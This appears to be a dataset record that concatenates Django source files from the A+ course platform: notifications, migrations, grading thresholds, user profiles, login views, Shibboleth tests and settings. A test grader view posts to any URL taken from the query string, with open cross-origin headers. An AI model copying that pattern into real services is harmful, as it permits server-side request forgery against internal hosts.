            not user.is_authenticated
            or user.userprofile.is_external
        )

    i = 0
    for item in news:
        i += 1
        item['collapsed'] = i > num
        if more > 0 and i == more:
            item['begin_more'] = True

    return {
        'is_course_staff': context['is_course_staff'],
        'now': context['now'],
        'alerts': alerts,
        'news': news,
        'more': more,
    }


@register.filter
def is_published(entry, now):
    return entry['publish'] <= now


@register.filter
def news_audience(audience):
    return News.AUDIENCE[audience]
/n/n/nnotification/cache.py/n/nfrom django.db.models.signals import post_save, post_delete

from lib.cache import CachedAbstract
from .models import Notification


class CachedNotifications(CachedAbstract):
    KEY_PREFIX = ""notifications""

    def __init__(self, user):
        super().__init__(user)

    def _generate_data(self, user, data=None):
        if not user or not user.is_authenticated:
            return {
                'count': 0,
                'notifications': [],
            }

        def notification_entry(n):
            exercise = n.submission.exercise if n.submission else None
            return {
                'id': n.id,
                'submission_id': n.submission.id if n.submission else 0,
                'name': ""{} {}, {}"".format(
                    n.course_instance.course.code,
                    (str(exercise.parent)
                        if exercise and exercise.parent else
                     n.course_instance.instance_name),
                    (str(exercise)
                        if exercise else
                     n.subject),
                ),
                'link': n.get_display_url(),
            }

        notifications = list(
            user.userprofile.received_notifications\
                .filter(seen=False)\
                .select_related(
                    'submission',
                    'submission__exercise',
                    'course_instance',
                    'course_instance__course',
                )
        )
        return {
            'count': len(notifications),
            'notifications': [notification_entry(n) for n in notifications],
        }

    def count(self):
        return self.data['count']

    def notifications(self):
        return self.data['notifications']


def invalidate_notifications(sender, instance, **kwargs):
    CachedNotifications.invalidate(instance.recipient.user)


# Automatically invalidate cache when notifications change.
post_save.connect(invalidate_notifications, sender=Notification)
post_delete.connect(invalidate_notifications, sender=Notification)
/n/n/nnotification/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-


from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('userprofile', '0001_initial'),
        ('course', '0001_initial'),
    ]

    operations = [
        migrations.CreateModel(
            name='Notification',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('subject', models.CharField(max_length=255)),
                ('notification', models.TextField()),
                ('timestamp', models.DateTimeField(auto_now_add=True)),
                ('seen', models.BooleanField(default=False)),
                ('course_instance', models.ForeignKey(to='course.CourseInstance', on_delete=models.CASCADE)),
                ('recipient', models.ForeignKey(related_name='received_notifications', to='userprofile.UserProfile', on_delete=models.CASCADE)),
                ('sender', models.ForeignKey(related_name='sent_notifications', to='userprofile.UserProfile', on_delete=models.CASCADE)),
            ],
            options={
                'ordering': ['-timestamp'],
            },
            bases=(models.Model,),
        ),
    ]
/n/n/nnotification/migrations/0002_auto_20160912_1341.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('exercise', '0022_auto_20160906_1401'),
        ('notification', '0001_initial'),
    ]

    operations = [
        migrations.AddField(
            model_name='notification',
            name='submission',
            field=models.ForeignKey(to='exercise.Submission', blank=True, null=True, on_delete=models.CASCADE),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='notification',
            name='notification',
            field=models.TextField(blank=True),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='notification',
            name='sender',
            field=models.ForeignKey(related_name='sent_notifications', to='userprofile.UserProfile', blank=True, null=True, on_delete=models.CASCADE),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='notification',
            name='subject',
            field=models.CharField(blank=True, max_length=255),
            preserve_default=True,
        ),
    ]
/n/n/nnotification/migrations/0003_auto_20160914_1051.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('notification', '0002_auto_20160912_1341'),
    ]

    operations = [
        migrations.AlterField(
            model_name='notification',
            name='submission',
            field=models.ForeignKey(blank=True, related_name='notifications', null=True, to='exercise.Submission', on_delete=models.CASCADE),
            preserve_default=True,
        ),
    ]
/n/n/nnotification/migrations/0004_auto_20190426_1731.py/n/n# -*- coding: utf-8 -*-
# Generated by Django 1.10.8 on 2019-04-26 14:31
from __future__ import unicode_literals

from django.db import migrations, models
import django.db.models.deletion


class Migration(migrations.Migration):

    dependencies = [
        ('notification', '0003_auto_20160914_1051'),
    ]

    operations = [
        migrations.AlterField(
            model_name='notification',
            name='sender',
            field=models.ForeignKey(blank=True, null=True, on_delete=django.db.models.deletion.SET_NULL, related_name='sent_notifications', to='userprofile.UserProfile'),
        ),
    ]
/n/n/nnotification/models.py/n/nfrom django.db import models

from course.models import CourseInstance
from exercise.models import Submission
from lib.models import UrlMixin
from userprofile.models import UserProfile


class Notification(UrlMixin, models.Model):
    """"""
    A user notification of some event, for example manual assessment.
    """"""
    subject = models.CharField(max_length=255, blank=True)
    notification = models.TextField(blank=True)
    sender = models.ForeignKey(UserProfile, on_delete=models.SET_NULL,
        related_name=""sent_notifications"", blank=True, null=True)
    recipient = models.ForeignKey(UserProfile, on_delete=models.CASCADE,
        related_name=""received_notifications"")
    timestamp = models.DateTimeField(auto_now_add=True)
    seen = models.BooleanField(default=False)
    course_instance = models.ForeignKey(CourseInstance, on_delete=models.CASCADE)
    submission = models.ForeignKey(Submission, on_delete=models.CASCADE,
        related_name=""notifications"", blank=True, null=True)

    class Meta:
        ordering = ['-timestamp']

    def __str__(self):
        return (
            ""To:"" + self.recipient.user.username + "", ""
            + (str(self.submission.exercise) if self.submission else self.subject)
        )

    @classmethod
    def send(cls, sender, submission):
        for recipient in submission.submitters.all():
            if Notification.objects.filter(
                submission=submission,
                recipient=recipient,
                seen=False,
            ).count() == 0:
                notification = Notification(
                    sender=sender,
                    recipient=recipient,
                    course_instance=submission.exercise.course_instance,
                    submission=submission,
                )
                notification.save()

    @classmethod
    def remove(cls, submission):
        Notification.objects.filter(
            submission=submission,
            recipient__in=submission.submitters.all(),
            seen=False,
        ).delete()

    ABSOLUTE_URL_NAME = ""notify""

    def get_url_kwargs(self):
        return dict(notification_id=self.id, **self.course_instance.get_url_kwargs())
/n/n/nselenium_test/grader/exercises/views.py/n/nfrom django.http import HttpResponse
from django.shortcuts import render
from django.urls import reverse


def first(request):

    if request.method == ""POST"":
        submission = request.POST.get(""answer"", """").lower()
        points = 0
        if 'hello' in submission:
            points += 1
        if 'a+' in submission:
            points += 1
        return render(request, ""exercises/first_result.html"", {
            ""points"": points,
            ""max_points"": 2,
        })

    return render(request, ""exercises/first_exercise.html"")


def file(request):

    if request.method == ""POST"":
        if ""myfile"" in request.FILES and request.FILES[""myfile""].name:
            status = ""accepted""
        else:
            status = ""error""
        return render(request, ""exercises/file_result.html"", {
            ""status"": status,
        })

    return render(request, ""exercises/file_exercise.html"")


def ajax(request):

    def parse_int(s):
        try:
            return int(s)
        except Exception:
            return 0

    if request.method == ""POST"":
        points = parse_int(request.POST.get(""points""))
        max_points = parse_int(request.POST.get(""max_points""))
        url = request.GET.get(""submission_url"")

        def respond_text(text):
            response = HttpResponse(text)
            response[""Access-Control-Allow-Origin""] = ""*""
            return response

        if not url:
            return respond_text('{ ""errors"": [""Missing submission_url""] }')

        import requests
        response = requests.post(url, timeout=3, data={
            ""points"": points,
            ""max_points"": max_points,
            ""feedback"": ""You got {} / {} points for your answer."".format(points, max_points),
            ""grading_payload"": ""{}"",
        })
        return respond_text(response.text)

    return render(request, ""exercises/ajax_exercise.html"", {
        ""url"": request.build_absolute_uri(""{}?{}"".format(
            reverse(""ajax""), request.META.get(""QUERY_STRING"", """")
        )),
    })
/n/n/nshibboleth_login/tests.py/n/nimport urllib.parse

from django.conf import settings
from django.contrib.auth.models import User
from django.urls import reverse
from django.test import TestCase, modify_settings
from django.utils import timezone


DEF_SHIBD_META = {
    'SHIB_cn': 'Teemu Teekkari',
    'SHIB_mail': 'teemu.teekkari@aalto.fi',
    'Shib-Authentication-Method': 'urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport',
    'Shib-Identity-Provider': 'https://locahost/idp/shibboleth',
    'SHIB_displayName': 'Teemudemus',
    'Shib-AuthnContext-Class': 'urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport',
    'SHIB_schacPersonalUniqueCode': 'urn:mace:terena.org:schac:personalUniqueCode:int:studentID:aalto.fi:123453',
    'Shib-Session-Index': '_941d95bafed0b1787c81541e627a8c8b',
    'SHIB_sn': 'Teekkari',
    'SHIB_givenName': 'Teemu',
    'Shib-Application-ID': 'default',
    'Shib-Authentication-Instant': str(timezone.now()),
    'Shib-Session-ID': '_92d7c6a832b5c7dafea59ea12ca1289e',
    'SHIB_preferredLanguage': 'fi',
    'SHIB_logouturl': 'https://localhost/idp/aalto_logout.jsp',
    'SHIB_eppn': 'teekkarit@aalto.fi',
}

@modify_settings(
    INSTALLED_APPS={'append': 'shibboleth_login'},
    AUTHENTICATION_BACKENDS={'append': 'shibboleth_login.auth_backend.ShibbolethAuthBackend'},
)
class ShibbolethTest(TestCase):

    def setUp(self):
        self.user = User(
            username='meikalm8@aalto.fi',
            email='',
            first_name='Matti',
            last_name='Sukunimi',
        )
        self.user.set_unusable_password()
        self.user.save()
        self.user.userprofile.student_id = '000'
        self.user.userprofile.save()

        self.login_url = reverse('shibboleth-login')

    def test_invalid(self):
        meta = DEF_SHIBD_META.copy()
        del meta['SHIB_eppn']
        response = self._get(meta)
        self.assertEqual(response.status_code, 403)
        self.assertEqual(User.objects.count(), 1)

    def test_valid_new(self):
        meta = DEF_SHIBD_META.copy()
        response = self._get(meta)
        self.assertEqual(response.status_code, 302)
        self.assertEqual(User.objects.count(), 2)
        user = User.objects.get(username='teekkarit@aalto.fi')
        self.assertEqual(user.email, 'teemu.teekkari@aalto.fi')
        self.assertEqual(user.first_name, 'Teemu')
        self.assertEqual(user.last_name, 'Teekkari')
        self.assertEqual(user.userprofile.student_id, '123453')

    def test_without_email(self):
        meta = DEF_SHIBD_META.copy()
        del meta['SHIB_mail']
        del meta['SHIB_givenName']
        response = self._get(meta)
        self.assertEqual(response.status_code, 302)
        self.assertEqual(User.objects.count(), 2)
        user = User.objects.get(username='teekkarit@aalto.fi')
        self.assertEqual(user.email, '{:d}@localhost'.format(user.id))
        self.assertEqual(user.first_name, '')
        self.assertEqual(user.last_name, 'Teekkari')
        self.assertEqual(user.userprofile.student_id, '123453')

    def test_without_student_id(self):
        meta = DEF_SHIBD_META.copy()
        del meta['SHIB_schacPersonalUniqueCode']
        response = self._get(meta)
        self.assertEqual(response.status_code, 302)
        self.assertEqual(User.objects.count(), 2)
        user = User.objects.get(username='teekkarit@aalto.fi')
        self.assertEqual(user.email, 'teemu.teekkari@aalto.fi')
        self.assertEqual(user.first_name, 'Teemu')
        self.assertEqual(user.last_name, 'Teekkari')
        self.assertEqual(user.userprofile.student_id, None)

    def test_valid_old(self):
        meta = DEF_SHIBD_META.copy()
        meta['SHIB_eppn'] = self.user.username
        del meta['SHIB_sn']
        response = self._get(meta)
        self.assertEqual(response.status_code, 302)
        self.assertEqual(User.objects.count(), 1)
        user = User.objects.first()
        self.assertEqual(user.email, 'teemu.teekkari@aalto.fi')
        self.assertEqual(user.first_name, 'Teemu')
        self.assertEqual(user.last_name, 'Sukunimi')
        self.assertEqual(user.userprofile.student_id, '123453')

    def test_nonascii(self):
        meta = DEF_SHIBD_META.copy()
        meta['SHIB_eppn'] = self.user.username.encode('utf-8')
        del meta['SHIB_givenName']
        meta['SHIB_sn'] = 'Meikäläinen'
        del meta['SHIB_schacPersonalUniqueCode']
        response = self._get(meta)
        self.assertEqual(response.status_code, 302)
        self.assertEqual(User.objects.count(), 1)
        user = User.objects.first()
        self.assertEqual(user.email, 'teemu.teekkari@aalto.fi')
        self.assertEqual(user.first_name, 'Matti')
        self.assertEqual(user.last_name, 'Meikäläinen')
        self.assertEqual(user.userprofile.student_id, '000')

    def test_inactive(self):
        self.user.is_active = False
        self.user.save()
        meta = DEF_SHIBD_META.copy()
        meta['SHIB_eppn'] = self.user.username.encode('utf-8')
        response = self._get(meta)
        self.assertEqual(response.status_code, 403)
        self.assertEqual(User.objects.count(), 1)

    def _get(self, meta):
        if settings.SHIBBOLETH_VARIABLES_URL_ENCODED:
            for key in meta.keys():
                meta[key] = urllib.parse.quote(meta[key])
        return self.client.generic('GET', self.login_url, **meta)
/n/n/nthreshold/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('course', '0032_auto_20170215_0953'),
        ('exercise', '0025_auto_20170215_0953'),
    ]

    operations = [
        migrations.CreateModel(
            name='CourseModuleRequirement',
            fields=[
                ('id', models.AutoField(verbose_name='ID', primary_key=True, auto_created=True, serialize=False)),
                ('negative', models.BooleanField(default=False)),
                ('module', models.ForeignKey(to='course.CourseModule', related_name='requirements', on_delete=models.CASCADE)),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='Threshold',
            fields=[
                ('id', models.AutoField(verbose_name='ID', primary_key=True, auto_created=True, serialize=False)),
                ('name', models.CharField(max_length=255)),
                ('consume_harder_points', models.BooleanField(help_text='Harder points are consumed by easier difficulty requirements.', default=False)),
                ('course_instance', models.ForeignKey(to='course.CourseInstance', related_name='thresholds', on_delete=models.CASCADE)),
                ('passed_categories', models.ManyToManyField(blank=True, to='course.LearningObjectCategory')),
                ('passed_exercises', models.ManyToManyField(blank=True, to='exercise.BaseExercise')),
                ('passed_modules', models.ManyToManyField(blank=True, to='course.CourseModule')),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='ThresholdPoints',
            fields=[
                ('id', models.AutoField(verbose_name='ID', primary_key=True, auto_created=True, serialize=False)),
                ('limit', models.PositiveIntegerField()),
                ('difficulty', models.CharField(blank=True, max_length=32)),
                ('order', models.PositiveIntegerField(default=1)),
                ('threshold', models.ForeignKey(to='threshold.Threshold', related_name='points', on_delete=models.CASCADE)),
            ],
            options={
                'ordering': ['threshold', 'order'],
            },
            bases=(models.Model,),
        ),
        migrations.AddField(
            model_name='coursemodulerequirement',
            name='threshold',
            field=models.ForeignKey(to='threshold.Threshold', on_delete=models.CASCADE),
            preserve_default=True,
        ),
    ]
/n/n/nthreshold/models.py/n/nfrom django.db import models
from django.utils.translation import ugettext_lazy as _

from course.models import (
    CourseInstance,
    CourseModule,
    LearningObjectCategory,
)
from exercise.cache.hierarchy import NoSuchContent
from exercise.models import BaseExercise


class Threshold(models.Model):
    """"""
    Course may set thresholds that signify module access or course grades.
    """"""
    course_instance = models.ForeignKey(CourseInstance, on_delete=models.CASCADE,
        related_name=""thresholds"")
    name = models.CharField(max_length=255)
    passed_modules = models.ManyToManyField(CourseModule, blank=True)
    passed_categories = models.ManyToManyField(LearningObjectCategory, blank=True)
    passed_exercises = models.ManyToManyField(BaseExercise, blank=True)
    consume_harder_points = models.BooleanField(default=False,
        help_text=_(""Harder points are consumed by easier difficulty requirements.""))

    def __str__(self):
        return self.name + "" "" + self.checks_str()

    def checks_str(self):
        checks = [
            "" "".join(str(m) for m in self.passed_modules.all()),
            "" "".join(str(c) for c in self.passed_categories.all()),
            "" "".join(str(e) for e in self.passed_exercises.all()),
            "" "".join(str(p) for p in self.points.all()),
        ]
        return "" "".join(checks)

    def is_passed(self, cached_points, unconfirmed=False):
        try:
            for module in self.passed_modules.all():
                entry,_,_,_ = cached_points.find(module)
                if not entry[""passed""]:
                    return False
            for category in self.passed_categories.all():
                if not cached_points.find_category(category.id)[""passed""]:
                    return False
            for exercise in self.passed_exercises.all():
                entry,_,_,_ = cached_points.find(exercise)
                if not entry[""passed""]:
                    return False
        except NoSuchContent:
            return False

        total = cached_points.total()
        d_points = total[""points_by_difficulty""].copy()
        if unconfirmed:
            u_points = total[""unconfirmed_points_by_difficulty""]
            for key,value in u_points.items():
                if key in d_points:
                    d_points[key] += value
                else:
                    d_points[key] = value
        return self._are_points_passed(total[""points""], d_points)

    def _are_points_passed(self, points, points_by_difficulty):
        if self.points.count() == 0:
            return True
        d_points = points_by_difficulty.copy()
        ds,ls = zip(*list((p.difficulty,p.limit) for p in self.points.all()))
        for i,d in enumerate(ds):
            if d:

                if self.consume_harder_points:
                    p = d_points.get(d, 0)
                    l = ls[i]
                    if p < l:
                        for j in range(i + 1, len(ds)):
                            jd = ds[j]
                            jp = d_points.get(jd, 0)
                            if jp > l - p:
                                d_points[jd] -= l - p
                                d_points[d] = l
                                break
                            else:
                                p += jp
                                d_points[d] = p
                                d_points[jd] = 0
                    else:
                        continue

                if d_points.get(d, 0) < ls[i]:
                    return False

            elif points < ls[i]:
                return False

        return True


class ThresholdPoints(models.Model):
    threshold = models.ForeignKey(Threshold, on_delete=models.CASCADE,
        related_name=""points"")
    limit = models.PositiveIntegerField()
    difficulty = models.CharField(max_length=32, blank=True)
    order = models.PositiveIntegerField(default=1)

    class Meta:
        ordering = ['threshold', 'order']

    def __str__(self):
        if self.difficulty:
            return ""{} {:d}"".format(self.difficulty, self.limit)
        return _(""{:d} points"").format(self.limit)


class CourseModuleRequirement(models.Model):
    module = models.ForeignKey(CourseModule, on_delete=models.CASCADE,
        related_name=""requirements"")
    threshold = models.ForeignKey(Threshold, on_delete=models.CASCADE)
    negative = models.BooleanField(default=False)

    def __str__(self):
        if self.negative:
            return ""< "" + self.threshold.checks_str()
        return self.threshold.checks_str()

    def is_passed(self, cached_points):
        passed = self.threshold.is_passed(cached_points, True)
        return not passed if self.negative else passed


# TODO: should implement course grades using thresholds
# TODO: should refactor diploma to use course grades
/n/n/nuserprofile/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-


from django.db import models, migrations
from django.conf import settings


class Migration(migrations.Migration):

    dependencies = [
        migrations.swappable_dependency(settings.AUTH_USER_MODEL),
    ]

    operations = [
        migrations.CreateModel(
            name='StudentGroup',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('name', models.CharField(unique=True, max_length=32)),
                ('description', models.CharField(max_length=256)),
                ('member_limit', models.PositiveIntegerField()),
                ('is_public', models.BooleanField(default=False)),
                ('invitation_key', models.CharField(max_length=10, blank=True)),
            ],
            options={
                'ordering': ['name'],
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='UserProfile',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('lang', models.CharField(default=b'en_US', max_length=5)),
                ('student_id', models.CharField(max_length=25, null=True, blank=True)),
                ('user', models.OneToOneField(to=settings.AUTH_USER_MODEL, on_delete=models.CASCADE)),
            ],
            options={
                'ordering': ['id'],
            },
            bases=(models.Model,),
        ),
        migrations.AddField(
            model_name='studentgroup',
            name='members',
            field=models.ManyToManyField(related_name='groups', to='userprofile.UserProfile'),
            preserve_default=True,
        ),
    ]
/n/n/nuserprofile/models.py/n/nfrom django.conf import settings
from django.contrib.auth.models import User, AnonymousUser
from django.urls import reverse
from django.db import models
from django.db.models.signals import post_save
from django.utils.functional import cached_property
from rest_framework.authtoken.models import Token


class UserProfileManager(models.Manager):

    def get_queryset(self):
        return super().get_queryset().select_related(""user"")


class UserProfile(models.Model):
    """"""
    Additional user information and methods.
    """"""

    @classmethod
    def get_by_student_id(cls, student_id):
        return cls.objects.get(student_id=student_id)

    @classmethod
    def get_by_email(cls, email):
        return User.objects.filter(email=email).first().userprofile

    @classmethod
    def get_by_request(cls, request):
        user = request.user
        if user.is_authenticated:
            return user.userprofile
        raise RuntimeError(""Seeking user profile without authenticated user."")

    user = models.OneToOneField(User, on_delete=models.CASCADE)
    # FIXME: refactor lang to selected_language which by default is blank
    lang = models.CharField(max_length=5, default=""en_US"")
    student_id = models.CharField(max_length=25, null=True, blank=True)
    objects = UserProfileManager()

    class Meta:
        ordering = ['id']

    def __str__(self):
        if self.student_id == None:
            return ""{} ({} {})"".format(self.user.username, self.user.first_name, self.user.last_name)
        else:
            return ""{} ({} {}, {})"".format(self.user.username, self.user.first_name, self.user.last_name, self.student_id)

    @cached_property
    def api_token(self):
        # FIXME: implement support for more than 1 token
        token, created = Token.objects.get_or_create(user=self.user)
        return token.key

    @cached_property
    def avatar_url(self):
        """"""
        URL address for gravatar image based on the user email.
        """"""
        import hashlib
        hash_key = hashlib.md5(self.user.email.encode('utf-8')).hexdigest()
        return ""http://www.gravatar.com/avatar/"" + hash_key + ""?d=identicon""

    @cached_property
    def shortname(self):
        """"""
        A short version of the user's name in form ""John D.""
        """"""
        try:
            return self.user.first_name + "" "" + self.user.last_name[0] + "".""
        except:
            return self.user.username

    @cached_property
    def is_external(self):
        """"""
        Is this an external rather than internal account.
        """"""
        return settings.SOCIAL_AUTH and self.user.social_auth.exists()

    def get_url(self, instance):
        kwargs = dict(user_id=self.user.id, **instance.get_url_kwargs())
        return reverse('user-results', kwargs=kwargs)


def create_user_profile(sender, instance, created, **kwargs):
    """"""
    This function automatically creates an user profile for all new User models. The profiles
    are used for extending the User models with domain specific attributes and behavior.

    @param sender: the signal that invoked the function
    @param instance: the User object that was just created
    @param created: a boolean whether the object was created and not just updated
    """"""
    if created:
        UserProfile.objects.get_or_create(user=instance)

# Attach to the post_save signal.
post_save.connect(create_user_profile, sender=User)


class GraderUser(AnonymousUser):
    @classmethod
    def from_submission(cls, submission):
        return cls(submission=submission)

    @classmethod
    def from_exercise(cls, exercise, student_id):
        return cls(exercise=exercise, student_id=student_id)

    def __init__(self, submission=None, exercise=None, **extra):
        self._submission = submission
        if exercise:
            self._exercise = exercise
        self._extra = extra

    @property
    def is_anonymous(self):
        """"""GraderUser is anonymous, but not AnonymousUser""""""
        return True

    @property
    def is_authenticated(self):
        return True

    # A-plus interface
    @property
    def userprofile(self):
        """"""Compatibilty with User.userprofile""""""
        return self

    @cached_property
    def _exercise(self):
        return self._submission.exercise

    @cached_property
    def _course_instance(self):
        return self._exercise.course_module.course_instance

    @cached_property
    def _course(self):
        return self._course_instance.course


class LTIServiceUser(GraderUser):
    def __init__(self, submission=None, exercise=None, lti_service=None, **kwargs):
        self.lti_service = lti_service
        super().__init__(submission=submission, exercise=exercise, **kwargs)
/n/n/nuserprofile/viewbase.py/n/nfrom django.core.exceptions import PermissionDenied
from django.template.response import SimpleTemplateResponse

from lib.viewbase import BaseMixin, BaseTemplateView
from authorization.permissions import ACCESS
from .models import UserProfile


class UserProfileMixin(BaseMixin):
    access_mode = ACCESS.STUDENT
    login_redirect = True

    def get_resource_objects(self):
        super().get_resource_objects()
        user = self.request.user
        if user.is_authenticated:
            self.profile = profile = user.userprofile
            self.is_external_student = profile.is_external
        else:
            self.profile = None
            self.is_external_student = False

        # Add available for template
        self.note(""profile"", ""is_external_student"")


class UserProfileView(UserProfileMixin, BaseTemplateView):
    pass
/n/n/nuserprofile/views.py/n/nimport logging
from django.conf import settings
from django.contrib.auth import REDIRECT_FIELD_NAME
from django.contrib.auth.views import login as django_login
from django.core.cache import cache
from django.core.cache.utils import make_template_fragment_key
from django.http.response import HttpResponseRedirect
from django.shortcuts import resolve_url
from django.template.loader import TemplateDoesNotExist, get_template
from django.utils.http import is_safe_url
from django.utils.translation import get_language
from django.utils.translation import ugettext_lazy as _

from lib.helpers import settings_text
from authorization.permissions import ACCESS
from .viewbase import UserProfileView


logger = logging.getLogger('userprofile.views')


def login(request):
    """"""
    Wraps the default login view in Django. Additionally redirects already
    authenticated users automatically to the target.
    """"""
    if request.user.is_authenticated:
        redirect_to = request.POST.get(REDIRECT_FIELD_NAME,
                                       request.GET.get(REDIRECT_FIELD_NAME, ''))
        if not is_safe_url(url=redirect_to, host=request.get_host()):
            redirect_to = resolve_url(settings.LOGIN_REDIRECT_URL)
        return HttpResponseRedirect(redirect_to)

    return django_login(
        request,
        template_name=""userprofile/login.html"",
        extra_context={
            'shibboleth_login': 'shibboleth_login' in settings.INSTALLED_APPS,
            'mooc_login': 'social_django' in settings.INSTALLED_APPS,
            'login_title_text': settings_text('LOGIN_TITLE_TEXT'),
            'login_body_text': settings_text('LOGIN_BODY_TEXT'),
            'login_button_text': settings_text('LOGIN_BUTTON_TEXT'),
            'shibboleth_title_text': settings_text('SHIBBOLETH_TITLE_TEXT'),
            'shibboleth_body_text': settings_text('SHIBBOLETH_BODY_TEXT'),
            'shibboleth_button_text': settings_text('SHIBBOLETH_BUTTON_TEXT'),
            'mooc_title_text': settings_text('MOOC_TITLE_TEXT'),
            'mooc_body_text': settings_text('MOOC_BODY_TEXT'),
        }
    )


def try_get_template(name):
    try:
        return get_template(name)
    except TemplateDoesNotExist:
        logger.info(""Template %s not found"", name)
        return None


class PrivacyNoticeView(UserProfileView):
    access_mode=ACCESS.ANONYMOUS
    template_name=""userprofile/privacy.html""

    def get_common_objects(self):
        super().get_common_objects()
        lang = ""_"" + get_language().lower()
        key = make_template_fragment_key('privacy_notice', [lang])
        privacy_text = cache.get(key)
        if not privacy_text:
            template_name = ""privacy_notice{}.html""
            template = try_get_template(template_name.format(lang))
            if not template and len(lang) > 3:
                template = try_get_template(template_name.format(lang[:3]))
            if not template:
                logger.warning(""No localized privacy notice for language %s"", lang)
                template = try_get_template(template_name.format(''))
            if not template:
                logger.error(""No privacy notice at all!"")

            privacy_text = template.render() if template else _(""No privacy notice. Please notify administration!"")
            cache.set(key, privacy_text)
        self.privacy_text = privacy_text
        self.note(""privacy_text"")

class ProfileView(UserProfileView):
    template_name = ""userprofile/profile.html""
/n/n/n",0
29,29,face34e3e6fe0d0a87d5987e107a1a3e092d73e9,"/aplus/api/__init__.py/n/nfrom django.core.urlresolvers import reverse
from rest_framework.settings import api_settings

def api_reverse(name, kwargs=None, **extra):
    if not kwargs:
        kwargs = {}
    kwargs.setdefault('version', api_settings.DEFAULT_VERSION)
    return reverse('api:' + name, kwargs=kwargs, **extra)
/n/n/n/aplus/settings.py/n/n####
# Default settings for A+ Django project.
# You should create local_settings.py to override any settings.
# You can copy local_settings.example.py and start from there.
##
from os.path import abspath, dirname, join
from django.utils.translation import ugettext_lazy as _
BASE_DIR = dirname(dirname(abspath(__file__)))


# Base options, commonly overridden in local_settings.py
##########################################################################
DEBUG = False
SECRET_KEY = None
ADMINS = (
    # ('Your Name', 'your_email@domain.com'),
)
#SERVER_EMAIL = 'root@'
EMAIL_TIMEOUT = 30 # Do not block web workers when email backend is broken
ALLOWED_HOSTS = [""*""]
##########################################################################


# Content (may override in local_settings.py)
#
# Any templates can be overridden by copying into
# local_templates/possible_path/template_name.html
##########################################################################
SITEWIDE_ALERT_TEXT = None
BRAND_NAME = 'A+'

WELCOME_TEXT = 'Welcome to A+ <small>modern learning environment</small>'
SHIBBOLETH_TITLE_TEXT = 'Aalto University users'
SHIBBOLETH_BODY_TEXT = 'Log in with Aalto University user account by clicking the button below. Programme students and faculty must login here.'
SHIBBOLETH_BUTTON_TEXT = 'Aalto Login'
MOOC_TITLE_TEXT = 'Users external to Aalto'
MOOC_BODY_TEXT = 'Some of our courses are open for everyone. Login with your user account from one of the following services.'
LOGIN_TITLE_TEXT = ''
LOGIN_BODY_TEXT = ''
LOGIN_BUTTON_TEXT = 'Maintenance login'
INTERNAL_USER_LABEL = 'Aalto'
EXTERNAL_USER_LABEL = 'MOOC'

WELCOME_TEXT_FI = 'A+ <small>verkkopohjainen oppimisympäristö</small>'
SHIBBOLETH_TITLE_TEXT_FI = 'Aalto-yliopiston käyttäjät'
SHIBBOLETH_BODY_TEXT_FI = 'Kirjaudu palveluun Aalto-yliopiston käyttäjätunnuksella alla olevasta painikkeesta. Koulutusohjelmien opiskelijoiden ja henkilökunnan pitää kirjautua tästä.'
SHIBBOLETH_BUTTON_TEXT_FI = 'Aalto-kirjautuminen'
MOOC_TITLE_TEXT_FI = 'Käyttäjät Aallon ulkopuolelta'
MOOC_BODY_TEXT_FI = 'Osa kursseistamme on avoinna kaikille. Kirjaudu sisään jonkin seuraavan palvelun käyttäjätunnuksellasi.'
LOGIN_TITLE_TEXT_FI = ''
LOGIN_BODY_TEXT_FI = ''
LOGIN_BUTTON_TEXT_FI = 'Ylläpidon kirjautuminen'

TRACKING_HTML = ''

EXCEL_CSV_DEFAULT_DELIMITER = ';'
##########################################################################

# Exercise loading settings
EXERCISE_HTTP_TIMEOUT = 15
EXERCISE_HTTP_RETRIES = (5,5,5)
EXERCISE_ERROR_SUBJECT = """"""A+ exercise error in {course}: {exercise}""""""
EXERCISE_ERROR_DESCRIPTION = """"""
As a course teacher or technical contact you were automatically emailed by A+ about the error incident. A student could not access or submit an exercise because the grading service used is offline or unable to produce valid response.

{message}

Open the exercise:
  {exercise_url}
Edit course email settings:
  {course_edit_url}

****************************************
Error trace:
****************************************

{error_trace}

****************************************
Request fields:
****************************************

{request_fields}
""""""

INSTALLED_APPS = (
    'django.contrib.contenttypes',
    'django.contrib.staticfiles',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.humanize',

    # 3rd party applications
    'bootstrapform',
    'rest_framework',
    'rest_framework.authtoken',

    # First party applications
    'inheritance',
    'userprofile',
    'authorization',
    'course',
    'exercise',
    'edit_course',
    'deviations',
    'notification',
    'external_services',
    'news',
    'threshold',
    'diploma',
    'apps',
    'redirect_old_urls',

    'js_jquery_toggle',
    'django_colortag',
)

# Different login options (may override in local_settings.py)
##########################################################################

## Shibboleth

#INSTALLED_APPS += ('shibboleth_login',)

# Apache module mod_uwsgi was unable to create UTF-8 environment variables.
# Problem was avoided by URL encoding in Shibboleth:
# <RequestMapper type=""Native"">
#   <RequestMap applicationId=""default"" encoding=""URL"" />
# </RequestMapper>
SHIBBOLETH_VARIABLES_URL_ENCODED = True

# Fields to receive from the Shibboleth (defaults).
#SHIB_USER_ID_KEY = 'SHIB_eppn'
#SHIB_FIRST_NAME_KEY = 'SHIB_displayName'
